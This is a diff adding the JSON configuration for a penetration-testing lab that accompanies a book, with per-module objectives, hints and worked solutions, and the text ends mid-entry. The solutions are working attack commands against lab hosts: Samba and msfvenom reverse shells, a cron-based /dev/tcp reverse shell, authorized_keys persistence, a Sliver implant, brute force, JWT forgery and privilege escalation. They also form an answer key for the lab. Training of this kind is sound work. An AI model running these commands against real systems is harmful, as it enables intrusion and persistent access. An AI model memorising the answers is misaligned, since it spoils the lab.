@@ -1,0 +1,614 @@
+{
+  "course": "Professional Penetration Testing",
+  "book": {
+    "title": "Professional Penetration Testing, 3rd Edition",
+    "subtitle": "Creating and Learning in a Hacking Lab",
+    "author": "Thomas Wilhelm",
+    "url": "https://link.amazon/B0bCq9qiD",
+    "cover": "book-cover.jpg",
+    "blurb": "This lab is the companion to the book. The book is your required reading; each module here is where you do the hands-on work it describes."
+  },
+  "scope": {
+    "summary": "You are engaged to assess the Pentest.TV corporate network: a DMZ of public-facing services and an internal segment holding the company's crown-jewel data. Work the engagement end to end, from reconnaissance through actions on objectives, and recover the flag that proves each step. Your desktop cannot reach the internal segment directly, so you will have to earn your way in, the same as a real engagement.",
+    "in_scope": [
+      "DMZ network 172.28.10.0/24, all hosts and services",
+      "Internal network 172.28.20.0/24, all hosts and services",
+      "Web, SMB, SSH, FTP, DNS, SNMP, SMTP and the phishing framework on those hosts"
+    ],
+    "out_of_scope": [
+      "The scoreboard and control plane you are reading now (host port 8890)",
+      "The Docker host itself and your own workstation",
+      "The public internet and any real third-party service",
+      "Denial of service against the host or the lab"
+    ],
+    "objectives": [
+      "Enumerate the network and map the attack surface",
+      "Gain an initial foothold on the DMZ perimeter",
+      "Recover valid credentials and pivot to the internal segment",
+      "Reach and exfiltrate the crown-jewel data on the file server",
+      "Capture each module's flag and record your steps for the capstone report"
+    ],
+    "rules": [
+      "The Kali attacker box (172.28.10.10 / 172.28.20.10) is yours. Everything else is a target.",
+      "Flags are random per deploy and look like PENTESTTV{...}. Submit them on the module cards below.",
+      "Enumerate before you exploit, and take notes as you go, as you would for a client.",
+      "Stuck or want a clean slate? Reset the lab from the controls above at any time."
+    ],
+    "methodology": "The lab follows the book's phases: reconnaissance, weaponization, delivery, exploitation, installation and persistence, command and control, and actions on objectives. Each module maps to a chapter, so read the chapter, then do the work here."
+  },
+  "modules": [
+    {
+      "id": "04-recon",
+      "title": "Reconnaissance",
+      "phase": "DMZ · External Foothold",
+      "chapter": 6,
+      "grading": "flag",
+      "flag_var": "MODULE_04_DNS_FLAG",
+      "target": null,
+      "objective": "Profile the network from the outside before you touch anything. Find the live hosts and the services they run, and look for one that gives away more than it should. Recover the flag that misconfiguration exposes.",
+      "hint": "Target: dns-01 (172.28.10.34), the DMZ DNS server on 53/tcp. Some DNS servers can be talked into handing over their entire zone in a single request; the flag is a record inside that zone.",
+      "solution": [
+        "From Kali, find the DNS host in the DMZ: nmap -p53 --open 172.28.10.0/24. It is 172.28.10.34 (dns-01).",
+        "Ask that server for a full copy of the zone, a zone transfer (AXFR): dig axfr pentesttv.local @172.28.10.34",
+        "The dumped zone lists every host plus a TXT record named flag. Its value is the PENTESTTV{...} flag.",
+        "Submit that value in the field below."
+      ]
+    },
+    {
+      "id": "06-delivery",
+      "title": "Delivery and Phishing",
+      "phase": "DMZ · External Foothold",
+      "chapter": 8,
+      "grading": "manual",
+      "target": "http://localhost:3333",
+      "objective": "Deliver a payload the human way. Build a phishing campaign, send it into the lab's own mail sink, and capture a credential from the landing page. Nothing leaves the lab.",
+      "hint": "Target: gophish (172.28.10.32, admin at localhost:3333). Build a phishing campaign and point its mail at the internal sink (mailhog:1025) so nothing leaves the lab.",
+      "solution": [
+        "Get the Gophish admin password from its logs: docker logs pentesttv-gophish | findstr -i password (PowerShell).",
+        "Log in at http://localhost:3333. Create a Sending Profile with SMTP host mailhog:1025 and no authentication.",
+        "Create an email template and a landing page, enabling Capture Submitted Data and Capture Passwords on the landing page.",
+        "Create a target group with a test recipient, then build and launch a campaign using those pieces.",
+        "View the delivered email in MailHog at http://localhost:8025, click through to the landing page at http://localhost:8088, submit test credentials, and confirm the capture appears in the Gophish campaign results. Mark done."
+      ]
+    },
+    {
+      "id": "07-exploitation",
+      "title": "Exploitation",
+      "phase": "DMZ · External Foothold",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07_LAB_FLAG",
+      "target": null,
+      "objective": "Turn your recon into access. The perimeter Linux host runs an exploitable service. Use it to land your first shell on the target and read the flag it protects.",
+      "hint": "Target: target-linux (dmz-01, 172.28.10.20), the perimeter Linux host. It shares files over SMB with a very old Samba that mishandles one of its config options in a way that lets you run commands.",
+      "solution": [
+        "Enumerate the target: nmap -sV 172.28.10.20. Note Samba on 139/445 and vsftpd on 21.",
+        "Start Metasploit (msfconsole) and select the Samba username map script module: use exploit/multi/samba/usermap_script",
+        "Set options: set RHOSTS 172.28.10.20, set LHOST 172.28.10.10 (your Kali DMZ address), set payload cmd/unix/reverse, then run.",
+        "You land a root shell. Read the flag: cat /root/ctf/lab_flag.txt",
+        "Submit that value. The vsftpd 2.3.4 backdoor on port 21 is an alternate way in and drops walkthrough_flag.txt."
+      ]
+    },
+    {
+      "id": "07c-mysql",
+      "title": "Database Exploitation (MySQL)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07C_MYSQL_FLAG",
+      "target": null,
+      "objective": "A database server on the DMZ trusts the wrong people. Find it, connect with the weak credentials it accepts, and read the secret stored in the corporate database.",
+      "hint": "Target: db-01 (172.28.10.40), a MySQL service on 3306. Its root account was left reachable from anywhere with no password. Connect and read the corp database.",
+      "solution": [
+        "Find the service: nmap -p3306 --open 172.28.10.0/24. It is 172.28.10.40 (db-01).",
+        "Connect as root with no password. The server offers a self-signed TLS cert, so disable TLS on the client: mysql -h 172.28.10.40 -u root --skip-ssl",
+        "Enumerate and read the flag: USE corp; SELECT * FROM secrets;",
+        "Submit the value of the exfil_flag row."
+      ]
+    },
+    {
+      "id": "07d-postgres",
+      "title": "Database Exploitation (PostgreSQL)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07D_PG_FLAG",
+      "target": null,
+      "objective": "A second database server accepts connections with no authentication at all. Reach it, open the corporate database, and read the secret it holds.",
+      "hint": "Target: db-02 (172.28.10.41), a PostgreSQL service on 5432 configured for trust authentication, so no password is needed. Connect to the corp database and read the secrets table.",
+      "solution": [
+        "Find the service: nmap -p5432 --open 172.28.10.0/24. It is 172.28.10.41 (db-02).",
+        "Connect with no password (trust auth): psql -h 172.28.10.41 -U postgres -d corp",
+        "Read the flag: SELECT * FROM secrets;",
+        "Submit the value of the exfil_flag row."
+      ]
+    },
+    {
+      "id": "07e-vnc",
+      "title": "Remote Desktop (VNC)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07E_VNC_FLAG",
+      "target": null,
+      "objective": "A workstation exposes its screen over VNC with a weak password. Two parts: you can recover the password with a brute-force attack from Kali, but viewing the desktop is a GUI step that runs on your own computer (the browser Kali is terminal only). Connect and read the flag left in plain sight.",
+      "hint": "Target: vnc-01 (172.28.10.42, published on your host at localhost:5901). VNC has no username, just a weak password you can brute force from Kali. Recover it, then connect with a VNC viewer on your own machine.",
+      "solution": [
+        "Find the service from Kali: nmap -p5900 --open 172.28.10.0/24. It is 172.28.10.42 (vnc-01), published on your host at localhost:5901.",
+        "Brute force the password from Kali. VNC has no username, so point hydra's VNC module at it: hydra -P /usr/share/wordlists/lab-passwords.txt vnc://172.28.10.42. It recovers the password: password",
+        "The remote desktop connection is a GUI step, so run it from your own computer, not the browser Kali. Point a VNC viewer (TigerVNC or RealVNC) at localhost:5901 and enter the recovered password.",
+        "A terminal on the desktop shows the flag, and it is also saved at /root/flag.txt. Submit that value."
+      ]
+    },
+    {
+      "id": "07f-smtp",
+      "title": "Mail Server Enumeration (SMTP)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07F_SMTP_FLAG",
+      "target": null,
+      "objective": "A mail server is too helpful. It leaks a sensitive maintenance note right in its banner, it answers VRFY so you can confirm which accounts exist, and it relays for anyone. Grab the banner for your flag, and note that the usernames you confirm (including jsmith) are another way into the password attack.",
+      "hint": "Target: smtp-01 (172.28.10.43), an SMTP server on 25 that answers VRFY and relays for any network. Grab its banner while you enumerate: it leaks more than a hostname.",
+      "solution": [
+        "Grab the banner, which leaks a maintenance note: nmap -sV -p25 172.28.10.43, or nc 172.28.10.43 25 and read the 220 line.",
+        "The banner's maint-note value is the flag (PENTESTTV{...}). Submit it.",
+        "While you are here, enumerate users with VRFY: nc 172.28.10.43 25 then type VRFY jsmith. A 252 or 250 reply confirms the account; ahill and mkhan exist too, and a made-up name is rejected. jsmith is a username you can feed to the SSH password attack.",
+        "Optionally demonstrate the open relay as well (MAIL FROM and RCPT TO to an outside domain are accepted)."
+      ]
+    },
+    {
+      "id": "12-web-dvwa",
+      "title": "Web Application (DVWA)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 14,
+      "grading": "manual",
+      "target": "http://localhost:8081",
+      "objective": "Work a deliberately vulnerable web app through your own proxy. Exercise the OWASP Top 10, SQL injection, command injection, XSS and file upload, until each class gives. Run this one from your own computer: the browser Kali is terminal only, so install Burp Suite on your machine, proxy your browser through it, and target DVWA at localhost:8081.",
+      "hint": "Target: DVWA on web-01 (172.28.10.30, localhost:8081). Drop the security level and work the OWASP Top 10 through your own proxy (Burp on your own OS).",
+      "solution": [
+        "Browse to http://localhost:8081 and log in with admin / password. If prompted, click Create / Reset Database and log in again.",
+        "On the DVWA Security page, set the level to Low.",
+        "Proxy your browser through Burp Suite on 127.0.0.1:8080 (Burp runs on your own OS).",
+        "Work each vulnerability page: SQL injection, command injection, reflected and stored XSS, and file upload. Mark done once you have landed at least one from each class."
+      ]
+    },
+    {
+      "id": "12-web-juice",
+      "title": "Modern Web (Juice Shop)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 14,
+      "grading": "manual",
+      "target": "http://localhost:3000",
+      "objective": "Attack a modern single-page app that scores itself. Find its hidden score board and work the challenge list from the easy ones up. Run this one from your own computer: the browser Kali is terminal only, so use your own desktop browser at localhost:3000, with Burp Suite on your machine if you want to intercept.",
+      "hint": "Target: Juice Shop (172.28.10.31, localhost:3000). Find the hidden score board, then start working the challenge list.",
+      "solution": [
+        "Browse to http://localhost:3000.",
+        "Find the hidden score board at http://localhost:3000/#/score-board. Finding it is itself the first challenge.",
+        "Work the challenges from there, starting with the easy ones. Juice Shop tracks your solved challenges automatically.",
+        "Mark this module done once you have cleared a few."
+      ]
+    },
+    {
+      "id": "ent-jwt",
+      "title": "SSO Token Forgery (JWT)",
+      "phase": "DMZ · External Foothold",
+      "chapter": 14,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_JWT_FLAG",
+      "target": "http://localhost:8085",
+      "objective": "Single sign-on lives or dies by its signing key. Get a user token from the SSO service, crack its weak HS256 secret offline, forge an admin token, and read the admin-only flag.",
+      "hint": "Target: sso-01 (172.28.10.72, localhost:8085), which issues HS256 JWTs. Its signing secret is weak and in the lab wordlist. The /admin endpoint wants role=admin.",
+      "solution": [
+        "Get a user token: curl http://172.28.10.72/login",
+        "Crack the HS256 secret offline with hashcat: put the token in a file and run hashcat -m 16500 jwt.txt /usr/share/wordlists/lab-passwords.txt. It recovers the signing secret.",
+        "Forge an admin token with that secret, e.g.: python3 -c \"import jwt;print(jwt.encode({'user':'x','role':'admin'},'<secret>',algorithm='HS256'))\"",
+        "Use it: curl -H 'Authorization: Bearer <forged>' http://172.28.10.72/admin, then submit the flag."
+      ]
+    },
+    {
+      "id": "12a-pillage",
+      "title": "Post-Exploitation Pillaging",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 12,
+      "grading": "flag",
+      "flag_var": "MODULE_12A_PILLAGE_FLAG",
+      "target": null,
+      "objective": "Owning a box is the start, not the end. Loot the host you rooted for what matters: configuration files, credentials, and secrets left lying around. Find the sensitive build token hidden in the loot.",
+      "hint": "Target: target-linux (dmz-01, 172.28.10.20). This builds on the Exploitation module. The steps below include how to root the box from scratch over the old Samba service before you loot it, so this module stands on its own. Do not stop at the obvious flag: look through its files for application configs and notes where developers leave secrets and other systems' credentials.",
+      "solution": [
+        "Foothold, repeated from the Exploitation module so this module is self-contained. Enumerate the host from Kali: nmap -sV 172.28.10.20. Note Samba on 139/445 and vsftpd on 21.",
+        "Exploit the old Samba to land a root shell. In Metasploit (msfconsole): use exploit/multi/samba/usermap_script, then set RHOSTS 172.28.10.20, set LHOST 172.28.10.10 (your Kali DMZ address), set payload cmd/unix/reverse, then run. You get a root shell. (The vsftpd 2.3.4 backdoor on port 21 is an alternate way in.)",
+        "Now pillage the box you just rooted. Look past the obvious flag: ls -la /root/ctf, then grep for secrets: grep -ri 'pass\\|secret\\|token' /root/ctf",
+        "Read the planted application config: cat /root/ctf/app_config.php. It holds an internal build token and a service account's credentials.",
+        "The build token value (PENTESTTV{...}) is your flag. Submit it.",
+        "Keep the svcapp credentials you found here: the Credential Reuse and Lateral Movement module uses them."
+      ]
+    },
+    {
+      "id": "04b-vulnscan",
+      "title": "Vulnerability Scanning",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 6,
+      "grading": "flag",
+      "flag_var": "MODULE_04B_VULNSCAN_FLAG",
+      "target": null,
+      "objective": "Move from mapping to assessment. Scan the lab's services and let the scan surface what they overshare. One network device publishes a maintenance token right in a protocol description field; find it, and build your target list from the rest.",
+      "hint": "Target: net-01 (172.28.20.40), the SNMP device. A scan of its SNMP service reads its system fields; one of them, the system description, carries more than a model string.",
+      "solution": [
+        "Scan the SNMP device and read its system description: nmap -sU -p161 --script snmp-sysdescr 172.28.20.40 (and nmap -sV --script vuln 172.28.10.0/24 to assess the rest of the lab).",
+        "Or read the system description directly: snmpwalk -v2c -c public 172.28.20.40 1.3.6.1.2.1.1.1",
+        "The system description leaks a maintenance token (PENTESTTV{...}). That is your flag; submit it.",
+        "The same scanning flags the real vulnerabilities (the vsftpd backdoor, weak database and VNC auth) as your target list for the exploitation modules."
+      ]
+    },
+    {
+      "id": "ent-ldap",
+      "title": "Directory Enumeration (LDAP)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 6,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_LDAP_FLAG",
+      "target": null,
+      "objective": "Enterprises run on a directory. Enumerate the LDAP service with an anonymous bind, pull the staff and service accounts, and find the service account whose password and audit token were left in its description fields.",
+      "hint": "Target: ldap-01 (172.28.20.90), which allows anonymous bind. ldapsearch dumps the tree; read the service accounts' attributes closely.",
+      "solution": [
+        "Dump the directory anonymously from Kali: ldapsearch -x -H ldap://172.28.20.90 -b dc=pentesttv,dc=local",
+        "Among the people entries, svc_backup has two description values: one leaks its password, the other is an audit-token flag.",
+        "Submit the audit-token value (PENTESTTV{...}). Keep the svc_backup password for reuse, and note the full employee list for spraying and phishing."
+      ]
+    },
+    {
+      "id": "06c-webdisc",
+      "title": "Web Content Discovery",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 14,
+      "grading": "flag",
+      "flag_var": "MODULE_06C_WEBDISC_FLAG",
+      "target": "http://localhost:8082",
+      "objective": "Not every page is linked. Brute force the intranet web server's directory structure to turn up a path the site never advertises, and read the file left in it.",
+      "hint": "Target: web-03, the intranet server (172.28.20.130, also localhost:8082). It hides content under a directory that is not linked anywhere. robots.txt hints at it; a directory brute forcer finds it outright.",
+      "solution": [
+        "Brute force directories against the intranet from Kali: gobuster dir -u http://172.28.20.130 -w /usr/share/wordlists/dirb/common.txt",
+        "It turns up /backup (also disclosed in http://172.28.20.130/robots.txt).",
+        "Read the file in it: curl http://172.28.20.130/backup/flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "ent-git",
+      "title": "Secrets in Source Control",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 12,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_GIT_FLAG",
+      "target": "http://localhost:8083",
+      "objective": "Developers commit secrets and 'remove' them later, but git never forgets. Clone the internal repo, dig through its history and CI pipeline, and recover the API key.",
+      "hint": "Target: git-01 (172.28.20.131, also localhost:8083), which serves a repo over HTTP. The current config looks clean; the history does not.",
+      "solution": [
+        "Clone the repo: git clone http://172.28.20.131/webapp.git && cd webapp",
+        "Review history: git log --oneline, then git log -p config.py (or git show on the first commit).",
+        "The original config.py committed an API_KEY (the flag) and a DB password; the Jenkinsfile holds hardcoded deploy creds.",
+        "Submit the API_KEY value (PENTESTTV{...})."
+      ]
+    },
+    {
+      "id": "ent-wiki",
+      "title": "Credentials in the Wiki",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 6,
+      "grading": "flag",
+      "flag_var": "MODULE_ENT_WIKI_FLAG",
+      "target": "http://localhost:8084",
+      "objective": "Internal wikis are full of operational secrets. Read the knowledge base, find the credentials staff pasted into a runbook, and the verification token on that page.",
+      "hint": "Target: wiki-01 (172.28.20.132, localhost:8084), the internal wiki. Its IT operations runbook leaks more than process.",
+      "solution": [
+        "Browse the wiki at http://172.28.20.132 (or localhost:8084) and open the IT Operations Runbook.",
+        "It exposes the jump-host operations account (opsadmin) and a change-control token.",
+        "Submit the token (PENTESTTV{...}). Keep the opsadmin credential: it is your way into the restricted segment."
+      ]
+    },
+    {
+      "id": "07b-password",
+      "title": "Password Attack (SSH)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07B_PW_FLAG",
+      "target": null,
+      "objective": "Not every way in is a software exploit. Recover a valid username from what the network leaks, then mount a remote password attack against its SSH service to recover the account's password. The flag proves you logged in.",
+      "hint": "Target: ws-01 (172.28.20.50), which runs SSH, but you need a valid username first. Two hosts leak one: the guest SMB share on files-01 (172.28.20.60) and the SNMP device net-01 (172.28.20.40). Recover the username, then run a remote password attack against SSH.",
+      "solution": [
+        "Find a username first. SMB: browse the guest share on the file server with smbclient //172.28.20.60/data -N, then cd into the it directory (cd it) and get helpdesk-notes.txt (non-interactive: smbclient //172.28.20.60/data -N -c 'cd it; get helpdesk-notes.txt'). It names jsmith@pentesttv.local on ws-01.",
+        "SNMP leaks the same name: snmpwalk -v2c -c public 172.28.20.40 sysContact returns jsmith@pentesttv.local (the Kali box has SNMP MIBs enabled; the numeric OID 1.3.6.1.2.1.1.4.0 works too).",
+        "Confirm SSH is open on ws-01: nmap -p22 172.28.20.50",
+        "Run the remote password attack against jsmith with hydra and the bundled lab wordlist: hydra -l jsmith -P /usr/share/wordlists/lab-passwords.txt -t 4 ssh://172.28.20.50. The full rockyou list also works: gunzip -k /usr/share/wordlists/rockyou.txt.gz first.",
+        "Hydra reports the valid password within the first couple hundred attempts. Log in: ssh jsmith@172.28.20.50, then read the proof flag: cat ~/loot/pwattack_flag.txt",
+        "Submit that value. This is the credential the Command and Control and Persistence modules build on."
+      ]
+    },
+    {
+      "id": "07g-spray",
+      "title": "Password Spraying",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 9,
+      "grading": "flag",
+      "flag_var": "MODULE_07G_SPRAY_FLAG",
+      "target": null,
+      "objective": "Brute forcing one account is loud and triggers lockouts. Spraying is the opposite: try a single likely password across many accounts at once. Find the user who reused the company's seasonal password, and read their flag.",
+      "hint": "Target: ws-01 (172.28.20.50). Its SSH has many accounts, and the company standardized on seasonal passwords (SeasonYYYY). Spray one across the whole user list rather than hammering one account.",
+      "solution": [
+        "Spray a single seasonal password across the user list with hydra (one -p, many -L): hydra -L /usr/share/wordlists/lab-users.txt -p 'Autumn2024' ssh://172.28.20.50",
+        "It lands on pmorgan, who reused that password.",
+        "Log in and read the flag: ssh pmorgan@172.28.20.50, then cat ~/loot/spray_flag.txt",
+        "Submit that value. Note how spraying one password avoids the account lockouts a per-account brute force would trigger."
+      ]
+    },
+    {
+      "id": "08a-payload",
+      "title": "Weaponization and Payload Delivery (msfvenom)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 7,
+      "grading": "flag",
+      "flag_var": "MODULE_08A_MSF_FLAG",
+      "target": null,
+      "objective": "Build your own payload and get it run on a victim. Craft a reverse-shell payload with msfvenom, deliver it to the internal workstation's drop share, catch the session when the user runs it, and read the flag from their account.",
+      "hint": "Target: ws-03 (172.28.20.70), which has a world-writable SMB share called drop and a user who runs whatever lands there. Build a Linux payload that calls back to your Kali box, drop it, and have your handler ready first.",
+      "solution": [
+        "Generate a Linux reverse-shell payload with msfvenom on Kali (LHOST is your internal Kali address): msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.28.20.10 LPORT=4444 -f elf -o payload.elf",
+        "Start the matching handler and leave it listening: msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 172.28.20.10; set LPORT 4444; run'",
+        "Deliver the payload to the workstation's writable share: smbclient //172.28.20.70/drop -N -c 'put payload.elf'",
+        "Within a minute the victim user runs it and your handler catches a Meterpreter session. In the session, read the flag: cat /home/victim/loot/user_flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "08-persistence",
+      "title": "Installation and Persistence",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 10,
+      "grading": "manual",
+      "target": null,
+      "objective": "A foothold you lose on reboot is not a foothold. Establish a way back into the internal workstation that survives without re-exploiting it, the way an operator keeps access through a long engagement.",
+      "hint": "Target: ws-01 (172.28.20.50). Once you hold it (log in as jsmith with the password you recovered), leave yourself a way back in that survives a reboot without re-exploiting it.",
+      "solution": [
+        "Reach the internal pivot host ws-01 (172.28.20.50) and log in as jsmith with the password you recovered in the Password Attack module.",
+        "On your Kali box, start a listener to catch the callback. ws-01 is on the internal segment, so use your internal Kali address (172.28.20.10): nc -lvnp 4444",
+        "On ws-01, install userland persistence that calls back every 5 minutes: (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/172.28.20.10/4444 0>&1\"') | crontab -",
+        "Alternatively (or additionally), drop your public key for key-based re-entry: mkdir -p /home/jsmith/.ssh && echo '<your Kali public key>' >> /home/jsmith/.ssh/authorized_keys && chmod 600 /home/jsmith/.ssh/authorized_keys",
+        "Verify: within ~5 minutes the cron fires and your nc listener catches a shell (or test the key: ssh -i <your key> jsmith@172.28.20.50). Confirm it works, then mark this module done."
+      ]
+    },
+    {
+      "id": "09-c2",
+      "title": "Command and Control",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_09_C2_FLAG",
+      "target": null,
+      "objective": "Reach the part of the network your desktop cannot. Route your traffic through the host you already control, operate against the internal segment, and recover the flag staged on the internal workstation.",
+      "hint": "Target: ws-01 (172.28.20.50), on the internal segment your desktop cannot reach directly. Route through the machine you already own, then read the user's loot.",
+      "solution": [
+        "From the exploited DMZ target, which is dual-homed onto 172.28.20.0/24, pivot inward. In Metasploit: run autoroute -s 172.28.20.0/24 on the session, or set up an SSH dynamic SOCKS proxy through the foothold.",
+        "Reach the internal pivot host ws-01 (172.28.20.50) as jsmith, using the password you recovered in the Password Attack module.",
+        "Read the C2 flag in the user's loot: cat /home/jsmith/loot/c2_flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "09d-sliver",
+      "title": "Command and Control (Sliver)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_09D_SLIVER_FLAG",
+      "target": null,
+      "objective": "Operate through a real C2 framework. Connect to the team's Sliver server from Kali, generate an implant, get it running on the internal workstation, and pull a flag back through the beacon, the way an operator runs a long engagement from dedicated C2 infrastructure.",
+      "hint": "Target: c2-01, the Sliver C2 server; an operator config for it is on your Kali box at /c2/operator.cfg. Import it, start a listener, generate a Linux implant that beacons to the C2's internal address (172.28.20.80), and deliver it to the ws-03 (172.28.20.70) drop share.",
+      "solution": [
+        "On Kali, import the operator config: sliver import /c2/operator.cfg",
+        "Launch the client and connect to the C2 server: sliver",
+        "In the Sliver console, start an mTLS listener on the C2: mtls (it listens on the default port 8888 and binds all interfaces). Confirm with jobs.",
+        "Generate a Linux implant that beacons to the C2's internal address (skip symbol obfuscation, which is not needed here and can fail the build): generate --mtls 172.28.20.80:8888 --os linux --arch amd64 --format elf --skip-symbols --save /tmp/implant.elf",
+        "From a second Kali shell, deliver it to the workstation (give the remote name so smbclient does not reuse the local path): smbclient //172.28.20.70/drop -N -c 'put /tmp/implant.elf implant.elf'. Within a minute the session shows up; list it with sessions.",
+        "Interact and read the flag through the beacon: use <session-id>, then cat /home/victim/loot/c2_flag.txt. Submit that value. Leaving the implant in place (it re-beacons) is your expanded persistence."
+      ]
+    },
+    {
+      "id": "11b-localpw",
+      "title": "Local Password Attack and Privilege Escalation",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_11B_PWCRACK_FLAG",
+      "target": null,
+      "objective": "You have a normal user shell on the internal workstation, but the prize is root. Find where the system leaked its own password hashes, crack root's password offline, escalate, and read the root-only flag.",
+      "hint": "Target: ws-01 (172.28.20.50). As jsmith you cannot read /etc/shadow, but an old world-readable backup of it was left behind. Crack root's hash offline, then su to root.",
+      "solution": [
+        "On ws-01 as jsmith, find the leaked hashes: cat /var/backups/shadow.bak (world-readable). It holds root's password hash.",
+        "Crack it offline with John and the bundled wordlist. Pull the file to Kali, then: john --wordlist=/usr/share/wordlists/lab-passwords.txt shadow.bak (or unshadow /etc/passwd shadow.bak > creds first).",
+        "John recovers root's password. Escalate on ws-01: su - root and enter it.",
+        "Read the root-only flag: cat /root/ctf/pwcrack_flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "11c-suid",
+      "title": "Privilege Escalation (SUID)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_11C_SUID_FLAG",
+      "target": null,
+      "objective": "A root-owned program with the setuid bit runs as root no matter who starts it. Find the misconfigured one on the workstation you landed on, abuse it to become root, and read the root-only flag.",
+      "hint": "Target: ws-03 (172.28.20.70), from your victim session. Hunt for setuid-root binaries; one of them is a shell in disguise.",
+      "solution": [
+        "You run this from a shell on ws-03 as the victim user. If you came in through the Sliver C2 implant you are at the Sliver prompt, which only accepts Sliver commands, not raw shell: drop to an OS shell on the session first with the shell command (sliver (SESSION) > shell). If you no longer have a session on ws-03, re-establish one with the Weaponization and Payload Delivery module (drop a reverse-shell or a fresh Sliver implant into the SMB drop share).",
+        "Find setuid-root binaries: find / -perm -4000 -type f 2>/dev/null",
+        "Most results are normal system binaries (su, sudo, passwd, mount...). The odd one out is /usr/bin/backuptool, a setuid-root copy of bash. Run it preserving privileges: /usr/bin/backuptool -p",
+        "You now have an euid-0 shell (check with id). The flag is root-only, so reading it as victim fails with permission denied until you escalate. Read it: cat /root/ctf/suid_flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "11d-sudo",
+      "title": "Privilege Escalation (sudo)",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 11,
+      "grading": "flag",
+      "flag_var": "MODULE_11D_SUDO_FLAG",
+      "target": null,
+      "objective": "A sloppy sudo rule can hand you root through a program that was never meant to escalate. Check what you are allowed to run as root on the workstation, and turn it into a root shell.",
+      "hint": "Target: ws-03 (172.28.20.70), as the victim user. Check your sudo rights: a command you can run as root without a password can be escaped into a shell (think GTFOBins).",
+      "solution": [
+        "You run this from a shell on ws-03 as the victim user. If you came in through the Sliver C2 implant you are at the Sliver prompt, which only accepts Sliver commands, not raw shell: drop to an OS shell on the session first with the shell command (sliver (SESSION) > shell). If you no longer have a session on ws-03, re-establish one with the Weaponization and Payload Delivery module (drop a reverse-shell or a fresh Sliver implant into the SMB drop share).",
+        "List your sudo rights: sudo -l",
+        "You may run find as root with no password. Escape it to a shell (GTFOBins): sudo find . -exec /bin/sh \\; -quit",
+        "You are now root (check with id). Read the flag: cat /root/ctf/sudo_flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "12b-credreuse",
+      "title": "Credential Reuse and Lateral Movement",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 12,
+      "grading": "flag",
+      "flag_var": "MODULE_12B_CREDREUSE_FLAG",
+      "target": null,
+      "objective": "People reuse passwords, and so do service accounts. Take the credentials you looted from the perimeter host and use them to move onto an internal host you could not touch before, then read the flag that account can see.",
+      "hint": "Target: ws-01 (172.28.20.50). The app config you pillaged named a service account, svcapp, and noted the password is reused for SSH. Try it here.",
+      "solution": [
+        "Use the looted svcapp credentials (from app_config.php) to log into the internal pivot over SSH: ssh svcapp@172.28.20.50",
+        "That is lateral movement: credentials from one host opened another, no exploit required.",
+        "Read the flag in svcapp's loot: cat ~/loot/credreuse_flag.txt",
+        "Submit that value."
+      ]
+    },
+    {
+      "id": "10-actions",
+      "title": "Actions on Objectives",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 12,
+      "grading": "flag",
+      "flag_var": "MODULE_10_EXFIL_FLAG",
+      "target": null,
+      "objective": "This is the point of the engagement: the data. Reach the internal file server, get into its share, and exfiltrate the crown-jewel file. The flag is your proof you pulled it.",
+      "hint": "Target: files-01 (172.28.20.60), the crown-jewel file server. It allows guest access to its share. Mount it from inside the network and look in the loot folder.",
+      "solution": [
+        "With internal access, list the shares on the file server: smbclient -L //172.28.20.60 -N",
+        "Connect to the data share as guest: smbclient //172.28.20.60/data -N",
+        "In the share: cd loot, then get exfil_flag.txt, and read it locally.",
+        "Submit that value. The Windows path to the same file is \\\\pentesttv-files\\data\\loot\\exfil_flag.txt."
+      ]
+    },
+    {
+      "id": "11-network",
+      "title": "Targeting the Network",
+      "phase": "Internal · Pivot and Escalate",
+      "chapter": 13,
+      "grading": "manual",
+      "target": null,
+      "objective": "Attack the network itself, not just the hosts on it. Enumerate a device that overshares over SNMP, and get between a workstation and its cleartext login to capture credentials off the wire.",
